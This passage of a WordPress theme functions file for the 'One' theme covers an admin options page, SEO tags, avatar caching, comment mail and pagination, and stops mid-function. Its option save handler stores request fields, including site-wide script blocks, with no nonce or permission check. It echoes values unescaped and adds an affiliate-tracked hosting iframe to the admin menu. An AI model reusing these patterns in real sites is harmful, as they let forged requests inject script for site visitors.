<?php
  $dname = 'One';
  add_action('after_setup_theme', 'deel_setup');
  $themename = $dname . '主题';
  $options = array(
      "d_description",
      "d_keywords",
      "d_tui",
      "d_logo_w",
      "d_sticky_count",
      "d_linkpage_cat",
      "d_tougao_b",
      "d_tougao_time",
      "d_avatar_b",
      "d_avatarDate",
      "d_sideroll_b",
      "d_sideroll_1",
      "d_sideroll_2",
      "d_pingback_b",
      "d_autosave_b",
      "d_tqq_b",
      "d_tqq",
      "d_weibo_b",
      "d_weibo",
      "d_facebook_b",
      "d_facebook",
      "d_twitter_b",
      "d_twitter",
      "d_rss",
      "d_bdshare",
      "d_maillist_b",
      "d_maillist",
      "d_track_b",
      "d_track",
      "d_headcode_b",
      "d_headcode",
      "d_footcode_b",
      "d_footcode",
      "d_adsite_01_b",
      "d_adsite_01",
      "d_adindex_02_b",
      "d_adindex_02",
      "d_adindex_01_b",
      "d_adindex_01",
      "d_adindex_03_b",
      "d_adindex_03",
      "d_adpost_01_b",
      "d_adpost_01",
      "d_adpost_02_b",
      "d_adpost_02",
      "d_adpost_03_b",
      "d_adpost_03"
  );
  function mytheme_add_admin() {
      global $themename, $options;
      if ($_GET['page'] == basename(__FILE__)) {
          if ('save' == $_REQUEST['action']) {
              foreach ($options as $value) {
                  update_option($value, $_REQUEST[$value]);
              }
              //header("Location: admin.php?page=one.php&saved=true");
              //die;
              
          }
      }
      add_theme_page($themename . " Options", 主题设置, 'edit_themes', basename(__FILE__) , 'mytheme_admin');
  }
  function mytheme_admin() {
      global $themename, $options;
      $i = 0;
      if ($_REQUEST['saved']) echo '<div class="updated settings-error"><p>' . $themename . '修改已保存</p></div>';
  ?>
  <script src="<?php
      bloginfo('template_url'); ?>/js/jquery.min.js"></script>
  <div class="wrap d_wrap">
  <link rel="stylesheet" href="<?php
      bloginfo('template_url') ?>/admin.css"/>
  <h2>前端中央集控台<span class="d_themedesc">主题作者：<a href="http://surmon.me/about" target="_blank">Surmon</a></span></h2>
  <form method="post" action="" class="d_formwrap" id="admin_form" >
  <table>
  <thead>
    <tr>
      <th width="200"></th>
      <th></th>
    </tr>
  </thead>
  <tr>
    <td class="d_tit">网站描述 [ Description ]</td>
    <td><input class="ipt-b" type="text" id="d_description" name="d_description" value="<?php
      echo dopt('d_description'); ?>"></td>
  </tr>
  <tr>
    <td class="d_tit">网站关键字 [ Keywords ]</td>
    <td><input class="ipt-b" type="text" id="d_keywords" name="d_keywords" value="<?php
      echo dopt('d_keywords'); ?>"></td>
  </tr>
  <tr>
    <td class="d_tit">Logo [ 标志 ] 宽度</td>
    <td><input class="d_num" name="d_logo_w" id="d_logo_w" type="number" value="<?php
      echo dopt('d_logo_w'); ?>">
      px（像素）<span class="d_tip">Logo图片在主题 [ IMG ] 文件夹下替换logo.png，高度为必须为 [ 40px ] ，默认宽度 [ 120PX ]</span></td>
  </tr>
  <tr>
    <td class="d_tit">导航与友情链接</td>
    <td><label class="checkbox inline">导航与友情链接请在 [ 后台—主题—菜单 ] 新建一个菜单，应用到相应模块即可<a href="./nav-menus.php">[ 点此设置 ]</a>&nbsp; &nbsp;</label></td>
  </tr>
  <tr>
    <td class="d_tit">BUG反馈入口</td>
    <td>你可以选择在<a href="http://surmon.me/228.html" target="_blank">[ 主题发布页面 ]</a>或者 加入QQ群：①&nbsp;<a href="http://shang.qq.com/wpa/qunwpa?idkey=837dc31ccbcd49feeba19430562be7bdc06f4428880f78a391fd61c8af714ce4" target="_blank" rel="nofollow">288325802</a>&nbsp;&nbsp;&nbsp;&nbsp;②&nbsp;<a href="http://shang.qq.com/wpa/qunwpa?idkey=7576e7204e01f8b9e26c90b4e0d84b6acab3b757e55286ba66e3b40ccec382e7" target="_blank" rel="nofollow">137080447</a>&nbsp;&nbsp;反馈主题问题</td>
  </tr>
  <tr>
    <td class="d_tit">禁止站内文章Pingback</td>
    <td><label class="checkbox inline">
      <input type="checkbox" id="d_pingback_b" name="d_pingback_b" <?php
      if (dopt('d_pingback_b')) echo 'checked="checked"' ?>>
      开启
      
      
      
      &nbsp; &nbsp;<span class="d_tip">开启后，不会发送站内Pingback，建议开启</span></label></td>
  </tr>
  <tr>
    <td class="d_tit">禁止后台编辑时自动保存</td>
    <td><label class="checkbox inline">
      <input type="checkbox" id="d_autosave_b" name="d_autosave_b" <?php
      if (dopt('d_autosave_b')) echo 'checked="checked"' ?>>
      开启
      
      
      
      &nbsp; &nbsp;<span class="d_tip">开启后，后台编辑文章时候不会定时保存，有效缩减数据库存储量；但是，一般不建议开启，除非你的数据库容量很小</span></label></td>
  </tr>
  <tr>
    <td class="d_tit">RSS订阅地址</td>
    <td><input class="d_inp_short" name="d_rss" id="d_rss" type="text" value="<?php
      echo dopt('d_rss'); ?>">
      <span class="d_tip">&nbsp;&nbsp;&nbsp;如果设置则使用设置地址，为空将使用博客默认feed地址，将会应用于侧边栏订阅按钮，<a href="//list.qq.com" target="_blank">[ 点此前往QQ订阅 ]</a></span></td>
  </tr>
  <tr>
    <td class="d_tit">选择网站配色</td>
    <td><div id="theme_now_color" style="display: none" ><?php
      echo dopt('d_maillist'); ?></div>
      <div id="theme_color">
        <label class="theme_color_default" >
        <input type="radio"   value="style">
        </label>
        <label class="theme_color_gray" >
        <input type="radio"   value="gray">
        </label>
        <label class="theme_color_pink" >
        <input type="radio"   value="pink">
        </label>
        <label class="theme_color_blue"  >
        <input type="radio"  value="blue">
        </label>
        <label class="theme_color_black" >
        <input type="radio"  value="black">
        </label>
      </div></td>
  </tr>
  <tr>
    <td class="d_tit">流量统计代码/全局代码</td>
    <td><label class="checkbox inline">
      <input type="checkbox" id="d_track_b" name="d_track_b" <?php
      if (dopt('d_track_b')) echo 'checked="checked"' ?>>
      开启</label>
      <textarea name="d_track" id="d_track" type="textarea" rows="4"><?php
      echo dopt('d_track'); ?></textarea>
      <span class="d_tip">统计网站流量，推荐使用百度统计、CNZZ等，此处也可以加入淘点金、对联广告等全局JS代代码，作用于全站</span></td>
  </tr>
  <tr>
    <td class="d_tit">页面头部
  <head>
  公共代码
  </td>
  <td><label class="checkbox inline">
      <input type="checkbox" id="d_headcode_b" name="d_headcode_b" <?php
      if (dopt('d_headcode_b')) echo 'checked="checked"' ?>>
      开启</label>
      <textarea name="d_headcode" id="d_headcode" type="textarea" rows="4"><?php
      echo dopt('d_headcode'); ?></textarea>
      <span class="d_tip">会应用于页面头部
  <head>区域，可放置广告代码等自定义[ css/js ]的全局代码块</span>
  </td>
  </tr>
  <tr>
    <td class="d_tit">页面底部
  <body>
  后公共代码
  </td>
  <td><label class="checkbox inline">
    <input type="checkbox" id="d_footcode_b" name="d_footcode_b" <?php
      if (dopt('d_footcode_b')) echo 'checked="checked"' ?>>
    开启 </label>
    <textarea name="d_footcode" id="d_footcode" type="textarea" rows="4"><?php
      echo dopt('d_footcode'); ?></textarea>
    <span class="d_tip">此处需使用全局性代码，会在
    <body>
    完全加载完之后才生效，建议使用如全局广告，JS效果，特殊统计代码，等等代码</span> </td>
  </tr>
  <tr>
    <td class="d_tit">广告：全站 - 导航下置顶横幅</td>
    <td><label class="checkbox inline">
      <input type="checkbox" id="d_adsite_01_b" name="d_adsite_01_b" <?php
      if (dopt('d_adsite_01_b')) echo 'checked="checked"' ?>>
      开启 </label>
      <textarea name="d_adsite_01" id="d_adsite_01" type="textarea" rows=""><?php
      echo dopt('d_adsite_01'); ?></textarea>
      <span class="d_tip">广告区域，任意联盟广告和自定义广告的代码均可，下同</span> </td>
  </tr>
  <tr>
    <td class="d_tit">广告：全站正文列表顶部</td>
    <td><label class="checkbox inline">
      <input type="checkbox" id="d_adindex_02_b" name="d_adindex_02_b" <?php
      if (dopt('d_adindex_02_b')) echo 'checked="checked"' ?>>
      开启 </label>
      <textarea name="d_adindex_02" id="d_adindex_02" type="textarea" rows=""><?php
      echo dopt('d_adindex_02'); ?></textarea>
    </td>
  </tr>
  <tr>
    <td class="d_tit">广告：单首页 - 导航下置顶横幅</td>
    <td><label class="checkbox inline">
      <input type="checkbox" id="d_adindex_01_b" name="d_adindex_01_b" <?php
      if (dopt('d_adindex_01_b')) echo 'checked="checked"' ?>>
      开启 </label>
      <textarea name="d_adindex_01" id="d_adindex_01" type="textarea" rows=""><?php
      echo dopt('d_adindex_01'); ?></textarea>
    </td>
  </tr>
  <tr>
    <td class="d_tit">广告：文章页 - 文章标题下横幅</td>
    <td><label class="checkbox inline">
      <input type="checkbox" id="d_adpost_01_b" name="d_adpost_01_b" <?php
      if (dopt('d_adpost_01_b')) echo 'checked="checked"' ?>>
      开启 </label>
      <textarea name="d_adpost_01" id="d_adpost_01" type="textarea" rows=""><?php
      echo dopt('d_adpost_01'); ?></textarea>
    </td>
  </tr>
  <tr>
    <td class="d_tit">广告：文章页 - 正文内容下</td>
    <td><label class="checkbox inline">
      <input type="checkbox" id="d_adpost_02_b" name="d_adpost_02_b" <?php
      if (dopt('d_adpost_02_b')) echo 'checked="checked"' ?>>
      开启 </label>
      <textarea name="d_adpost_02" id="d_adpost_02" type="textarea" rows=""><?php
      echo dopt('d_adpost_02'); ?></textarea>
    </td>
  </tr>
  <tr>
    <td class="d_tit">广告 : 侧边栏浮动广告位</td>
    <td><textarea name="d_tui" id="d_tui" type="textarea" rows=""><?php
      echo dopt('d_tui'); ?></textarea>
      <span class="d_tip">边栏唯一的广告位/下拉后可以浮动/最佳展示位置，不设置则为空白，可以放置html代码</span> </td>
  </tr>
  <tr>
    <td class="d_tit">主题中心更多资源</td>
    <td><a href="http://surmon.me/" target="_blank">作者博客</a>&nbsp;&nbsp; <a href="http://surmon.me/about" target="_blank">更多主题</a>&nbsp;&nbsp; <a href="http://surmon.me/go/aliyun" target="_blank">阿里云服务器</a> </td>
  </tr>
  <tr>
    <td class="d_tit"></td>
    <td><div class="d_desc">
        <input class="button-primary" name="save" type="submit" value="保存设置">
      </div>
      <input type="hidden" name="action" value="save">
    </td>
  </tr>
  </table>
  </form>
  </div>
  <script>

  var aaa = []

  jQuery('.d_wrap input, .d_wrap textarea').each(function(e){

      if( jQuery(this).attr('id') ) aaa.push( jQuery(this).attr('id') )

  });

  $(function(){
            var $theme_input = $('#theme_color input');
            var $theme_label = $('#theme_color>label');
            var $theme_color_now = $('#theme_now_color').html();
            //如果没有设置过或者设置为默认的则给默认的打钩，否则开始遍历
            if ($theme_color_now == "style" || $theme_color_now == "" ) {
                  $('.theme_color_default>input').attr('id','d_maillist');
                  $('.theme_color_default>input').attr('name','d_maillist');
                  $('.theme_color_default>input').attr('checked','');
                $('.theme_color_default').addClass('checked');
              }else{
                $theme_input.each(function(){
                if ($(this).val() == $theme_color_now) {
                  $(this).parent().addClass('checked');
                  $(this).attr('checked','');
                  $(this).attr('id','d_maillist');
                  $(this).attr('name','d_maillist');
                }
                  });
              };
            $theme_input.click(function(){
              //每次点击时，给所有标签移除数据，然后给当前点击的标签添加上数据
              //$theme_input.removeAttr('checked');
              $theme_input.attr('id','');
              $theme_input.attr('name','');
              //$(this).attr('checked','');
              $(this).attr('id','d_maillist');
              $(this).attr('name','d_maillist');
            });
            $theme_label.click(function(){
              $theme_label.removeClass('checked');
              $(this).addClass('checked');
            });
          });

  </script>
  <?php
  }
  add_action('admin_menu', 'mytheme_add_admin');
  require_once (TEMPLATEPATH . '/theme-updates/theme-update-checker.php');
  $wpdaxue_update_checker = new ThemeUpdateChecker('One', //主题名字
  'http://surmon.me/theme/update/One.json');
  add_filter('the_content', 'substr_content');
  function substr_content($content) {
      if (!is_singular()) {
          $content = mb_strimwidth(strip_tags($content) , 0, 310);
      }
      return $content;
  }
  function Uazoh_remove_help_tabs($old_help, $screen_id, $screen) {
      $screen->remove_help_tabs();
      return $old_help;
  }
  add_filter('contextual_help', 'Uazoh_remove_help_tabs', 10, 3);
  $match_num_from = 1;
  $match_num_to = 20; //一个关键字最多替换
  add_filter('the_content', 'tag_link', 10);
  function tag_sort($a, $b) {
      if ($a->name == $b->name) return 0;
      return (strlen($a->name) > strlen($b->name)) ? -1 : 1;
  }
  function tag_link($content) {
      global $match_num_from, $match_num_to;
      $posttags = get_the_tags();
      if ($posttags) {
          usort($posttags, "tag_sort");
          foreach ($posttags as $tag) {
              $link = get_tag_link($tag->term_id);
              $keyword = $tag->name;
              $cleankeyword = stripslashes($keyword);
              $url = "<a href=\"$link\" title=\"" . str_replace('%s', addcslashes($cleankeyword, '$') , __('更多关于 %s 的文章')) . "\"";
              $url.= 'class="tag_link"';
              $url.= ">" . addcslashes($cleankeyword, '$') . "</a>";
              $limit = rand($match_num_from, $match_num_to);
              $content = preg_replace('|(<a[^>]+>)(.*)(' . $ex_word . ')(.*)(</a[^>]*>)|U' . $case, '$1$2%&&&&&%$4$5', $content);
              $content = preg_replace('|(<img)(.*?)(' . $ex_word . ')(.*?)(>)|U' . $case, '$1$2%&&&&&%$4$5', $content);
              $cleankeyword = preg_quote($cleankeyword, '\'');
              $regEx = '\'(?!((<.*?)|(<a.*?)))(' . $cleankeyword . ')(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;
              $content = preg_replace($regEx, $url, $content, $limit);
              $content = str_replace('%&&&&&%', stripslashes($ex_word) , $content);
          }
      }
      return $content;
  }
  function deel_setup() {
      //移除头部多余信息
      remove_action('wp_head', 'wp_generator'); //禁止在head泄露wordpress版本号
      remove_action('wp_head', 'rsd_link'); //移除head中的rel="EditURI"
      remove_action('wp_head', 'wlwmanifest_link'); //移除head中的rel="wlwmanifest"
      remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0); //rel=pre
      remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0); //rel=shortlink
      remove_action('wp_head', 'rel_canonical');
      //禁用Google Open Sans字体，加速网站
      add_filter('gettext_with_context', 'wpdx_disable_open_sans', 888, 4);
      function wpdx_disable_open_sans($translations, $text, $context, $domain) {
          if ('Open Sans font: on or off' == $context && 'on' == $text) {
              $translations = 'off';
          }
          return $translations;
      }
      //隐藏admin Bar
      function hide_admin_bar($flag) {
          return false;
      }
      add_filter('show_admin_bar', 'hide_admin_bar');
      //关键字
      add_action('wp_head', 'deel_keywords');
      //页面描述
      add_action('wp_head', 'deel_description');
      //阻止站内PingBack
      if (dopt('d_pingback_b')) {
          add_action('pre_ping', 'deel_noself_ping');
      }
      //评论回复邮件通知
      add_action('comment_post', 'comment_mail_notify');
      //自动勾选评论回复邮件通知，不勾选则注释掉
      // add_action('comment_form','deel_add_checkbox');
      //评论表情改造，如需更换表情，images/smilies/下替换
      add_filter('smilies_src', 'deel_smilies_src', 1, 10);
      //文章末尾增加版权
      add_filter('the_content', 'deel_copyright');
      //移除自动保存和修订版本
      if (dopt('d_autosave_b')) {
          add_action('wp_print_scripts', 'deel_disable_autosave');
          remove_action('pre_post_update', 'wp_save_post_revision');
      }
      //去除自带js
      wp_deregister_script('l10n');
      //修改默认发信地址
      add_filter('wp_mail_from', 'deel_res_from_email');
      add_filter('wp_mail_from_name', 'deel_res_from_name');
      //缩略图设置
      add_theme_support('post-thumbnails');
      set_post_thumbnail_size(140, 100, true);
      add_editor_style('editor-style.css');
      //头像缓存
      if (dopt('d_avatar_b')) {
          add_filter('get_avatar', 'deel_avatar');
      }
      //定义菜单
      register_nav_menus(array(
          'header_menu' => __('顶部菜单') ,
          'friendLink_menu' => __('友链菜单')
      ));
  }
  if (!function_exists('deel_paging')):
      function deel_paging() {
          $p = 4;
          if (is_singular()) return;
          global $wp_query, $paged;
          $max_page = $wp_query->max_num_pages;
          if ($max_page == 1) return;
          echo '<div class="pagination"><ul>';
          if (empty($paged)) $paged = 1;
          // echo '<span class="pages">Page: ' . $paged . ' of ' . $max_page . ' </span> ';
          echo '<li>';
          previous_posts_link('上一页');
          echo '</li>';
          if ($paged > $p + 1) p_link(1, '<li>第一页</li>');
          if ($paged > $p + 2) echo "<li><span>···</span></li>";
          for ($i = $paged - $p; $i <= $paged + $p; $i++) {
              if ($i > 0 && $i <= $max_page) $i == $paged ? print "<li class=\"active\"><span>{$i}</span></li>" : p_link($i);
          }
          if ($paged < $max_page - $p - 1) echo "<li><span> ... </span></li>";
          //if ( $paged < $max_page - $p ) p_link( $max_page, '&raquo;' );
          echo '<li>';
          next_posts_link('下一页');
          echo '</li>';
          // echo '<li><span>共 '.$max_page.' 页</span></li>';
          echo '</ul></div>';
      }
      function p_link($i, $title = '') {
          if ($title == '') $title = "第 {$i} 页";
          echo "<li><a href='", esc_html(get_pagenum_link($i)) , "'>{$i}</a></li>";
      }
  endif;
  function deel_strimwidth($str, $start, $width, $trimmarker) {
      $output = preg_replace('/^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . $start . '}((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,' . $width . '}).*/s', '\1', $str);
      return $output . $trimmarker;
  }
  function dopt($e) {
      return stripslashes(get_option($e));
  }
  if (!function_exists('deel_views')):
      function deel_record_visitors() {
          if (is_singular()) {
              global $post;
              $post_ID = $post->ID;
              if ($post_ID) {
                  $post_views = (int)get_post_meta($post_ID, 'views', true);
                  if (!update_post_meta($post_ID, 'views', ($post_views + 1))) {
                      add_post_meta($post_ID, 'views', 1, true);
                  }
              }
          }
      }
      add_action('wp_head', 'deel_record_visitors');
      function deel_views($after = '') {
          global $post;
          $post_ID = $post->ID;
          $views = (int)get_post_meta($post_ID, 'views', true);
          echo $views, $after;
      }
  endif;
  if (!function_exists('deel_thumbnail')):
      function deel_thumbnail() {
          global $post;
          if (has_post_thumbnail()) {
              $domsxe = simplexml_load_string(get_the_post_thumbnail());
              $thumbnailsrc = $domsxe->attributes()->src;
              echo '<img src="' . $thumbnailsrc . '" alt="' . trim(strip_tags($post->post_title)) . '" />';
          } else {
              $content = $post->post_content;
              preg_match_all('/<img.*?(?: |\\t|\\r|\\n)?src=[\'"]?(.+?)[\'"]?(?:(?: |\\t|\\r|\\n)+.*?)?>/sim', $content, $strResult, PREG_PATTERN_ORDER);
              $n = count($strResult[1]);
              if ($n > 0) {
                  echo '<img src="' . $strResult[1][0] . '" alt="' . trim(strip_tags($post->post_title)) . '" />';
              } else {
                  echo '<img src="' . get_bloginfo('template_url') . '/images/thumbnail.jpg" alt="' . trim(strip_tags($post->post_title)) . '" />';
              }
          }
      }
  endif;
  // 取消原有jQuery
  if (!is_admin()) {
      if ($localhost == 0) {
          function my_init_method() {
              wp_deregister_script('jquery');
          }
          add_action('init', 'my_init_method');
      }
  }
  //头像缓存更换为本地默认
  function deel_avatar_default() {
      return get_bloginfo('template_directory') . '/images/default.png';
  }
  //评论头像缓存
  function deel_avatar($avatar) {
      $tmp = strpos($avatar, 'http');
      $g = substr($avatar, $tmp, strpos($avatar, "'", $tmp) - $tmp);
      $tmp = strpos($g, 'avatar/') + 7;
      $f = substr($g, $tmp, strpos($g, "?", $tmp) - $tmp);
      $w = get_bloginfo('wpurl');
      $e = ABSPATH . 'avatar/' . $f . '.png';
      $t = dopt('d_avatarDate') * 24 * 60 * 60;
      if (!is_file($e) || (time() - filemtime($e)) > $t) copy(htmlspecialchars_decode($g) , $e);
      else $avatar = strtr($avatar, array(
          $g => $w . '/avatar/' . $f . '.png'
      ));
      if (filesize($e) < 500) copy(get_bloginfo('template_directory') . '/images/default.png', $e);
      return $avatar;
  }
  //关键字
  function deel_keywords() {
      global $s, $post;
      $keywords = '';
      if (is_single()) {
          if (get_the_tags($post->ID)) {
              foreach (get_the_tags($post->ID) as $tag) $keywords.= $tag->name . ', ';
          }
          foreach (get_the_category($post->ID) as $category) $keywords.= $category->cat_name . ', ';
          $keywords = substr_replace($keywords, '', -2);
      } elseif (is_home()) {
          $keywords = dopt('d_keywords');
      } elseif (is_tag()) {
          $keywords = single_tag_title('', false);
      } elseif (is_category()) {
          $keywords = single_cat_title('', false);
      } elseif (is_search()) {
          $keywords = esc_html($s, 1);
      } else {
          $keywords = trim(wp_title('', false));
      }
      if ($keywords) {
          echo "<meta name=\"keywords\" content=\"$keywords\">\n";
      }
  }
  //网站描述
  function deel_description() {
      global $s, $post;
      $description = '';
      $blog_name = get_bloginfo('name');
      if (is_singular()) {
          if (!empty($post->post_excerpt)) {
              $text = $post->post_excerpt;
          } else {
              $text = $post->post_content;
          }
          $description = trim(str_replace(array(
              "\r\n",
              "\r",
              "\n",
              "　",
              " "
          ) , " ", str_replace("\"", "'", strip_tags($text))));
          if (!($description)) $description = $blog_name . "-" . trim(wp_title('', false));
      } elseif (is_home()) {
          $description = dopt('d_description'); // 首頁要自己加
          
      } elseif (is_tag()) {
          $description = $blog_name . "'" . single_tag_title('', false) . "'";
      } elseif (is_category()) {
          $description = $blog_name . "'" . single_cat_title('', false) . "'";
      } elseif (is_archive()) {
          $description = $blog_name . "'" . trim(wp_title('', false)) . "'";
      } elseif (is_search()) {
          $description = $blog_name . ": '" . esc_html($s, 1) . "' 的搜索結果";
      } else {
          $description = $blog_name . "'" . trim(wp_title('', false)) . "'";
      }
      $description = mb_substr($description, 0, 220, 'utf-8');
      echo "<meta name=\"description\" content=\"$description\">\n";
  }
  //最新发布加new 单位'小时'
  function deel_post_new($timer = '48') {
      $t = (strtotime(date("Y-m-d H:i:s")) - strtotime($post->post_date)) / 3600;
      if ($t < $timer) echo "<i>new</i>";
  }
  //修改评论表情调用路径
  function deel_smilies_src($img_src, $img, $siteurl) {
      return get_bloginfo('template_directory') . '/images/smilies/' . $img;
  }
  //阻止站内文章Pingback
  function deel_noself_ping(&$links) {
      $home = get_option('home');
      foreach ($links as $l => $link) if (0 === strpos($link, $home)) unset($links[$l]);
  }
  //移除自动保存
  function deel_disable_autosave() {
      wp_deregister_script('autosave');
  }
  //修改默认发信地址
  function deel_res_from_email($email) {
      $wp_from_email = get_option('admin_email');
      return $wp_from_email;
  }
  function deel_res_from_name($email) {
      $wp_from_name = get_option('blogname');
      return $wp_from_name;
  }
  //自动勾选
  function deel_add_checkbox() {
      echo '<label for="comment_mail_notify" class="checkbox inline" style="padding-top:0"><input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked"/>有人回复时邮件通知我</label>';
  }
  add_action('admin_menu', 'register_custom_menu_page');
  function register_custom_menu_page() {
      add_menu_page('阿里云主机', '阿里云主机', 'administrator', 'custompage', 'custom_menu_page', ('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAKHSURBVEhL7VNNiE1hGL6IzdAgpiakbKiRbBSzk2ymlLJRWCgbLJQs7GanycLGxgILy2tlgZ2k0NQdTblEXLfz952/e8/9c+/5+c45r+c9viHdMXdWlDz1db6/9z3P+zzvV/o3Ydv5mOvSRsuibZhP2Ha8v9HIDwuR71ZXRmNx0R4TIjlkGPFZx5E3kOSxaSZvMd4LEQWWFXfxjVxXphiGZYXHiWiNCv89TDPaa1nRPC7/gJRESUIUhkSDwc9vmhKBhIb7+1T4ykCZO8Hmju9nT8H4CQJfIsECRkUIueC66WvM73pefhrSTLFMKvQvoFwur/P9fBPYTDIbw4hmoOsZHpDpBLSe5tKbzXyXEN3tmtbeokKXh67nWxGA8tMXCK5i3ka50nEyajSImk0i3y80JfxEwsAYc8u25WfHSR563tdJlepXVCq0Xoj0nOelMRvGBoE1cWLXzanXI+r3iYKAsJdTu/3dPDaWASKv4M0OlW4YaLMDnpfNgflzlC7xIyTOwFTeB9Obtp2YnU6x/mRZSbGHCi+jglMjZWGYZnje82QaRcwmKavtEuZXYtSE8uu4c0xtrw66Hl4IAtnl8qHhu1qNxtVRaXaW1iL5B5YKLZmjmlvV6oh2w4UN6ILrvi+zVosN45KTeyh7BuwuYX5ViHgOL/JLs5kWHrDuWL8xzcG0SjMM1ggmzGfZkvsJQeeUDWT2DDbPNGOPO4TPuVs6HSJdj06qNMvDMPp4dfEzfrKQoUjEOqPsEMaVoe0RTQv3wLSPfIeTwrxrKnxl1Outza6bPOJWgoENML4NlgfVcQF+KK1W2sf3gdpaHWq1YBwtd1HT4im1NQTDkEdtuzehlv/xR1EqfQOIVJFXAh7MPAAAAABJRU5ErkJggg==') , 6);
  }
  function custom_menu_page() {
      echo "<iframe src=\"http://www.aliyun.com/product/ecs/?ali_trackid=2:mm_41374337_3506389_14770331:1438013463_2k2_741742676\" runat=\"server\" width=\"100%\" height=\"700px\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"yes\" allowtransparency=\"yes\" ></iframe><style>#wpcontent, #wpfooter{margin-left: 160px;}</style>";
  }
  //文章（包括feed）末尾加版权说明
  function deel_copyright($content) {
      if (!is_page()) {
          $content.= '<p>转载请注明来源：<a href="' . get_bloginfo('url') . '">' . get_bloginfo('name') . '</a> &raquo; <a href="' . get_permalink() . '">' . get_the_title() . '</a></p>';
      }
      return $content;
  }
  //时间显示方式‘xx以前’
  function time_ago($type = 'commennt', $day = 7) {
      $d = $type == 'post' ? 'get_post_time' : 'get_comment_time';
      if (time() - $d('U') > 60 * 60 * 24 * $day) return;
      echo ' (', human_time_diff($d('U') , strtotime(current_time('mysql', 0))) , '前)';
  }
  //评论样式
  function deel_comment_list($comment, $args, $depth) {
      echo '<li ';
      comment_class();
      echo ' id="comment-' . get_comment_ID() . '">';
      //头像
      echo '<div class="c-avatar">';
      echo get_avatar($comment->comment_author_email, $size = '36', $default = get_bloginfo('template_directory') . '/images/default.png');
      echo '</div>';
      //内容
      echo '<div class="c-main" id="div-comment-' . get_comment_ID() . '">';
      echo comment_text();
      if ($comment->comment_approved == '0') {
          echo '<span class="c-approved">您的评论正在排队审核中，请稍后！</span><br />';
      }
      //信息
      echo '<div class="c-meta">';
      echo '<span class="c-author">' . get_comment_author_link() . '</span>';
      echo get_comment_time('Y-m-d H:i ');
      echo time_ago();
      if ($comment->comment_approved !== '0') {
          echo comment_reply_link(array_merge($args, array(
              'add_below' => 'div-comment',
              'depth' => $depth,
              'max_depth' => $args['max_depth']
          )));
          echo edit_comment_link(__('(编辑)') , ' - ', '');
      }
      echo '</div>';
      echo '</div>';
  }
  //评论邮件自动通知
  function comment_mail_notify($comment_id) {
      $admin_email = get_bloginfo('admin_email');
      $comment = get_comment($comment_id);
      $comment_author_email = trim($comment->comment_author_email);
      $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
      $to = $parent_id ? trim(get_comment($parent_id)->comment_author_email) : '';
      $spam_confirmed = $comment->comment_approved;
      if (($parent_id != '') && ($spam_confirmed != 'spam') && ($to != $admin_email) && ($comment_author_email == $admin_email)) {
          $wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME']));
          $subject = '您在 [' . get_option("blogname") . '] 的评论有新的回复';
          $message = '  



      <div style="font: 13px Microsoft Yahei;padding: 0px 20px 0px 20px;border: #ccc 1px solid;border-left-width: 4px; max-width: 600px;margin-left: auto;margin-right: auto;">  



        <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>  



        <p>您曾在 [' . get_option("blogname") . '] 的文章 《' . get_the_title($comment->comment_post_ID) . '》 上发表评论：<br />' . nl2br(get_comment($parent_id)->comment_content) . '</p>  



        <p>' . trim($comment->comment_author) . ' 给您的回复如下:<br>' . nl2br($comment->comment_content) . '</p>  



        <p style="color:#f00">您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id, array(
              'type' => 'comment'
          ))) . '">查看回复的完整內容</a></p>  



        <p style="color:#f00">欢迎再次光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>  



        <p style="color:#999">(此邮件由系统自动发出，请勿回复。)</p>  



      </div>';
          $message = convert_smilies($message);
          $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
          $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
          wp_mail($to, $subject, $message, $headers);
      }
  }
  add_action('comment_post', 'comment_mail_notify');
  remove_action('wp_head', 'feed_links_extra', 3); // Display the links to the extra feeds such as category feeds
  remove_action('wp_head', 'feed_links', 2); // Display the links to the general feeds: Post and Comment Feed
  remove_action('wp_head', 'rsd_link'); // Display the link to the Really Simple Discovery service endpoint, EditURI link
  remove_action('wp_head', 'wlwmanifest_link'); // Display the link to the Windows Live Writer manifest file.
  remove_action('wp_head', 'index_rel_link'); // index link
  remove_action('wp_head', 'parent_post_rel_link', 10, 0); // prev link
  remove_action('wp_head', 'start_post_rel_link', 10, 0); // start link
  remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0); // Display relational links for the posts adjacent to the current post.
  remove_action('wp_head', 'wp_generator'); // Display the XHTML generator that is generated on the wp_head hook, WP version
  function add_editor_buttons($buttons) {
      $buttons[] = 'fontselect';
      $buttons[] = 'fontsizeselect';
      $buttons[] = 'cleanup';
      $buttons[] = 'styleselect';
      $buttons[] = 'hr';
      $buttons[] = 'del';
      $buttons[] = 'sub';
      $buttons[] = 'sup';
      $buttons[] = 'copy';
      $buttons[] = 'paste';
      $buttons[] = 'cut';
      $buttons[] = 'undo';
      $buttons[] = 'image';
      $buttons[] = 'anchor';
      $buttons[] = 'backcolor';
      $buttons[] = 'wp_page';
      $buttons[] = 'charmap';
      return $buttons;
  }
  add_filter("mce_buttons_3", "add_editor_buttons");
  function get_category_root_id($cat) {
      $this_category = get_category($cat); // 取得当前分类
      while ($this_category->category_parent) // 若当前分类有上级分类时，循环
      {
          $this_category = get_category($this_category->category_parent); // 将当前分类设为上级分类（往上爬）
          
      }
      return $this_category->term_id; // 返回根分类的id号
      //return $this_category->slug;//返回跟分类的别名
      
  }
  function get_category_root_slug($cat) {
      $this_category = get_category($cat); // 取得当前分类
      while ($this_category->category_parent) // 若当前分类有上级分类时，循环
      {
